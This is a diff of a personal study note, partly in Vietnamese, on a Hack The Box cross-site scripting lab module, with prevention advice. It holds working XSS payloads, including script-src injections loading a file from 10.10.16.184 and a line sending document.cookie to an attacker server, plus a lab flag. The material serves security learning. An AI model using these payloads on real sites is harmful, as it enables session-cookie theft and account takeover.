@@ -17,11 +17,15 @@ tags: [learning, red-team, htb, cwes]
 
 ![image.png](/assets/img/module-7-cross-site-scripting-xss/module-7-cross-site-scripting-xss-image.png)
 
+```html
 <script>alert(window.origin)</script>
+```
 
 ![image.png](/assets/img/module-7-cross-site-scripting-xss/module-7-cross-site-scripting-xss-image-1.png)
 
+```html
 <script>alert(document.cookie)</script>
+```
 
 ![image.png](/assets/img/module-7-cross-site-scripting-xss/module-7-cross-site-scripting-xss-image-2.png)
 
@@ -51,7 +55,17 @@ tags: [learning, red-team, htb, cwes]
 
 ![image.png](/assets/img/module-7-cross-site-scripting-xss/module-7-cross-site-scripting-xss-image-8.png)
 
-<img src="" onerror="alert(document.cookie)">, vì script sử dụng innerHTML nên vì lý do bảo mật mà nó không cho phép chèn <script></script> vào do vậy phải sử dụng phương thức khác.
+```html
+<img src="x" alt="dom-xss" onerror="alert(document.cookie)">
+```
+
+Vì script sử dụng `innerHTML`, nên vì lý do bảo mật nó không cho phép chèn:
+
+```html
+<script></script>
+```
+
+do vậy phải sử dụng phương thức khác.
 
 ![image.png](/assets/img/module-7-cross-site-scripting-xss/module-7-cross-site-scripting-xss-image-9.png)
 
@@ -209,22 +223,32 @@ This time, we cannot just simply use xssStrike, as the guide said that we’re f
 
 ![image.png](/assets/img/module-7-cross-site-scripting-xss/module-7-cross-site-scripting-xss-image-33.png)
 
-imgurl="><script src=http://10.10.16.184/imgurl></script> payload hoạt động.
+Payload hoạt động:
+
+```html
+imgurl="><script src="http://10.10.16.184/imgurl"></script>
+```
 
 ![image.png](/assets/img/module-7-cross-site-scripting-xss/module-7-cross-site-scripting-xss-image-34.png)
 
 use the payload “
 
-`new Image().src='http://OUR_IP/index.php?c='+document.cookie;`
+```javascript
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
 ” to get the cookie.
 
 Create the payload that send cookie to our server:
 
+```html
 imgurl="><script src=http://10.10.16.184/script.js></script>
+```
 
 create our script.js file that contains:
 
-`new Image().src='http://OUR_IP/index.php?c='+document.cookie;`
+```javascript
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
 
 result: c00k1355h0u1d8353cu23d
 
@@ -260,9 +284,12 @@ As the front-end of the web application is where most (but not all) of the user 
 
 For example, in the exercise of the `XSS Discovery` section, we saw that the web application will not allow us to submit the form if the email format is invalid. This was done with the following JavaScript code:
 
-```jsx
-        javascript
-function validateEmail(email) {    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;    return re.test($("#login input[name=email]").val());}
+```javascript
+function validateEmail(email) {
+    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+
+    return re.test($("#login input[name=email]").val());
+}
 ```
 
 As we can see, this code is testing the `email` input field and returning `true` or `false` whether it matches the Regex validation of an email format.
@@ -282,10 +309,19 @@ This will escape any special characters with a backslash `\`, which should help
 
 Finally, we should always ensure that we never use user input directly within certain HTML tags, like:
 
-1. JavaScript code `<script></script>`
-2. CSS Style Code `<style></style>`
-3. Tag/Attribute Fields `<div name='INPUT'></div>`
-4. HTML Comments `<!-- -->`
+1. JavaScript code 
+```html
+<script></script>
+```
+2. CSS Style Code 
+```html
+<style></style>
+```
+3. Tag/Attribute Fields 
+```html
+<div name='INPUT'></div>
+````
+4. HTML Comments 
 
 If user input goes into any of the above examples, it can inject malicious JavaScript code, which may lead to an XSS vulnerability. In addition to this, we should avoid using JavaScript functions that allow changing raw text of HTML fields, like:
 
@@ -428,7 +464,17 @@ Manual test to confirm the param that vulnerable to XSS:
 
 Use the previous file script.js to gain the Cookie: payload 
 
-`comment=122&author=abc&email=admin%40pygoat.com&url='><script src=http://10.10.16.184/script.js></script>&submit=Post+Comment&comment_post_ID=8&comment_parent=0`
+Payload:
+
+```html
+comment=122&
+author=abc&
+email=admin%40pygoat.com&
+url='><script src="http://10.10.16.184/script.js"></script>&
+submit=Post+Comment&
+comment_post_ID=8&
+comment_parent=0
+```
 
 ![image.png](/assets/img/module-7-cross-site-scripting-xss/module-7-cross-site-scripting-xss-image-44.png)
 
